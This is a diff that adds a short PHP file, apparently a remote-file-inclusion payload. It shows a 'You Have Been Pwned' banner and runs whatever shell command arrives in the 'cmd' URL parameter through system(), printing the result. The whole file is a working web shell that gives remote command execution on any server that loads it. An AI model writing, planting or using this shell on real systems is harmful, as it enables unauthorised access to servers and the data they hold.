@@ -1,0 +1,22 @@
+<?php
+echo "<div style='
+    background-color: #111;
+    color: #0f0;
+    font-family: monospace;
+    padding: 20px;
+    border: 2px solid red;
+    border-radius: 10px;
+    text-align: center;
+'>
+    <h1>💀 You Have Been Pwned 💀</h1>
+    <p>RFI successful. Shell access granted.</p>
+</div>";
+
+if (isset($_GET['cmd'])) {
+    echo "<pre style='background:#000; color:#0f0; padding:10px; border-radius:5px;'>";
+    system($_GET['cmd']);
+    echo "</pre>";
+} else {
+    echo "<p style='color: #f33;'>No command received. Try <code>?cmd=whoami</code></p>";
+}
+?>
